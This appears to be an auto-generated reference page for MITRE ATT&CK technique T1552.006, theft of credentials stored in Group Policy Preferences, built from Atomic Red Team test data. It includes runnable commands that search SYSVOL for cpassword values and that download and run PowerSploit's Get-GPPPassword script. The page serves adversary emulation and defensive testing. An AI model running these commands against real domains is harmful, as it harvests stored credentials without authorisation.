
# Group Policy Preferences

## Description

### MITRE Description

> Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)

These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>
* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>


## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1552/006

## Potential Commands

```
findstr /S cpassword %logonserver%\sysvol\*.xml
. #{gpp_script_path}
Get-GPPPassword -Verbose
. PathToAtomicsFolder\T1552.006\src\Get-GPPPassword.ps1
Get-GPPPassword -Verbose
```

## Commands Dataset

```
[{'command': 'findstr /S cpassword %logonserver%\\sysvol\\*.xml\n',
  'name': None,
  'source': 'atomics/T1552.006/T1552.006.yaml'},
 {'command': '. #{gpp_script_path}\nGet-GPPPassword -Verbose\n',
  'name': None,
  'source': 'atomics/T1552.006/T1552.006.yaml'},
 {'command': '. PathToAtomicsFolder\\T1552.006\\src\\Get-GPPPassword.ps1\n'
             'Get-GPPPassword -Verbose\n',
  'name': None,
  'source': 'atomics/T1552.006/T1552.006.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Unsecured Credentials: Group Policy Preferences': {'atomic_tests': [{'auto_generated_guid': '870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f',
                                                                                               'dependencies': [{'description': 'Computer '
                                                                                                                                'must '
                                                                                                                                'be '
                                                                                                                                'domain '
                                                                                                                                'joined\n',
                                                                                                                 'get_prereq_command': 'Write-Host '
                                                                                                                                       'Joining '
                                                                                                                                       'this '
                                                                                                                                       'computer '
                                                                                                                                       'to '
                                                                                                                                       'a '
                                                                                                                                       'domain '
                                                                                                                                       'must '
                                                                                                                                       'be '
                                                                                                                                       'done '
                                                                                                                                       'manually\n',
                                                                                                                 'prereq_command': 'if((Get-CIMInstance '
                                                                                                                                   '-Class '
                                                                                                                                   'Win32_ComputerSystem).PartOfDomain) '
                                                                                                                                   '{exit '
                                                                                                                                   '0} '
                                                                                                                                   'else '
                                                                                                                                   '{exit '
                                                                                                                                   '1}\n'}],
                                                                                               'dependency_executor_name': 'powershell',
                                                                                               'description': 'Look '
                                                                                                              'for '
                                                                                                              'the '
                                                                                                              'encrypted '
                                                                                                              'cpassword '
                                                                                                              'value '
                                                                                                              'within '
                                                                                                              'Group '
                                                                                                              'Policy '
                                                                                                              'Preference '
                                                                                                              'files '
                                                                                                              'on '
                                                                                                              'the '
                                                                                                              'Domain '
                                                                                                              'Controller. '
                                                                                                              'This '
                                                                                                              'value '
                                                                                                              'can '
                                                                                                              'be '
                                                                                                              'decrypted '
                                                                                                              'with '
                                                                                                              'gpp-decrypt '
                                                                                                              'on '
                                                                                                              'Kali '
                                                                                                              'Linux.\n',
                                                                                               'executor': {'command': 'findstr '
                                                                                                                       '/S '
                                                                                                                       'cpassword '
                                                                                                                       '%logonserver%\\sysvol\\*.xml\n',
                                                                                                            'name': 'command_prompt'},
                                                                                               'name': 'GPP '
                                                                                                       'Passwords '
                                                                                                       '(findstr)',
                                                                                               'supported_platforms': ['windows']},
                                                                                              {'auto_generated_guid': 'e9584f82-322c-474a-b831-940fd8b4455c',
                                                                                               'dependencies': [{'description': 'Get-GPPPassword '
                                                                                                                                'PowerShell '
                                                                                                                                'Script '
                                                                                                                                'must '
                                                                                                                                'exist '
                                                                                                                                'at '
                                                                                                                                '#{gpp_script_path}\n',
                                                                                                                 'get_prereq_command': 'New-Item '
                                                                                                                                       '-ItemType '
                                                                                                                                       'Directory '
                                                                                                                                       '(Split-Path '
                                                                                                                                       '"#{gpp_script_path}") '
                                                                                                                                       '-Force '
                                                                                                                                       '| '
                                                                                                                                       'Out-Null\n'
                                                                                                                                       'Invoke-WebRequest '
                                                                                                                                       '#{gpp_script_url} '
                                                                                                                                       '-OutFile '
                                                                                                                                       '"#{gpp_script_path}"\n',
                                                                                                                 'prereq_command': 'if(Test-Path '
                                                                                                                                   '"#{gpp_script_path}") '
                                                                                                                                   '{exit '
                                                                                                                                   '0 '
                                                                                                                                   '} '
                                                                                                                                   'else '
                                                                                                                                   '{exit '
                                                                                                                                   '1 '
                                                                                                                                   '}\n'},
                                                                                                                {'description': 'Computer '
                                                                                                                                'must '
                                                                                                                                'be '
                                                                                                                                'domain '
                                                                                                                                'joined\n',
                                                                                                                 'get_prereq_command': 'Write-Host '
                                                                                                                                       'Joining '
                                                                                                                                       'this '
                                                                                                                                       'computer '
                                                                                                                                       'to '
                                                                                                                                       'a '
                                                                                                                                       'domain '
                                                                                                                                       'must '
                                                                                                                                       'be '
                                                                                                                                       'done '
                                                                                                                                       'manually\n',
                                                                                                                 'prereq_command': 'if((Get-CIMInstance '
                                                                                                                                   '-Class '
                                                                                                                                   'Win32_ComputerSystem).PartOfDomain) '
                                                                                                                                   '{exit '
                                                                                                                                   '0} '
                                                                                                                                   'else '
                                                                                                                                   '{exit '
                                                                                                                                   '1}\n'}],
                                                                                               'dependency_executor_name': 'powershell',
                                                                                               'description': 'Look '
                                                                                                              'for '
                                                                                                              'the '
                                                                                                              'encrypted '
                                                                                                              'cpassword '
                                                                                                              'value '
                                                                                                              'within '
                                                                                                              'Group '
                                                                                                              'Policy '
                                                                                                              'Preference '
                                                                                                              'files '
                                                                                                              'on '
                                                                                                              'the '
                                                                                                              'Domain '
                                                                                                              'Controller.\n'
                                                                                                              'This '
                                                                                                              'test '
                                                                                                              'is '
                                                                                                              'intended '
                                                                                                              'to '
                                                                                                              'be '
                                                                                                              'run '
                                                                                                              'from '
                                                                                                              'a '
                                                                                                              'domain '
                                                                                                              'joined '
                                                                                                              'workstation, '
                                                                                                              'not '
                                                                                                              'on '
                                                                                                              'the '
                                                                                                              'Domain '
                                                                                                              'Controller '
                                                                                                              'itself.\n'
                                                                                                              'The '
                                                                                                              'Get-GPPPasswords.ps1 '
                                                                                                              'executed '
                                                                                                              'during '
                                                                                                              'this '
                                                                                                              'test '
                                                                                                              'can '
                                                                                                              'be '
                                                                                                              'obtained '
                                                                                                              'using '
                                                                                                              'the '
                                                                                                              'get-prereq_commands.\n'
                                                                                                              '\n'
                                                                                                              'Successful '
                                                                                                              'test '
                                                                                                              'execution '
                                                                                                              'will '
                                                                                                              'either '
                                                                                                              'display '
                                                                                                              'the '
                                                                                                              'credentials '
                                                                                                              'found '
                                                                                                              'in '
                                                                                                              'the '
                                                                                                              'GPP '
                                                                                                              'files '
                                                                                                              'or '
                                                                                                              'indicate '
                                                                                                              '"No '
                                                                                                              'preference '
                                                                                                              'files '
                                                                                                              'found".\n',
                                                                                               'executor': {'command': '. '
                                                                                                                       '#{gpp_script_path}\n'
                                                                                                                       'Get-GPPPassword '
                                                                                                                       '-Verbose\n',
                                                                                                            'name': 'powershell'},
                                                                                               'input_arguments': {'gpp_script_path': {'default': 'PathToAtomicsFolder\\T1552.006\\src\\Get-GPPPassword.ps1',
                                                                                                                                       'description': 'Path '
                                                                                                                                                      'to '
                                                                                                                                                      'the '
                                                                                                                                                      'Get-GPPPassword '
                                                                                                                                                      'PowerShell '
                                                                                                                                                      'Script',
                                                                                                                                       'type': 'Path'},
                                                                                                                   'gpp_script_url': {'default': 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1',
                                                                                                                                      'description': 'URL '
                                                                                                                                                     'of '
                                                                                                                                                     'the '
                                                                                                                                                     'Get-GPPPassword '
                                                                                                                                                     'PowerShell '
                                                                                                                                                     'Script',
                                                                                                                                      'type': 'url'}},
                                                                                               'name': 'GPP '
                                                                                                       'Passwords '
                                                                                                       '(Get-GPPPassword)',
                                                                                               'supported_platforms': ['windows']}],
                                                                             'attack_technique': 'T1552.006',
                                                                             'display_name': 'Unsecured '
                                                                                             'Credentials: '
                                                                                             'Group '
                                                                                             'Policy '
                                                                                             'Preferences'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations


* [Audit](../mitigations/Audit.md)

* [Update Software](../mitigations/Update-Software.md)
    
* [Active Directory Configuration](../mitigations/Active-Directory-Configuration.md)
    

# Actors


* [APT33](../actors/APT33.md)

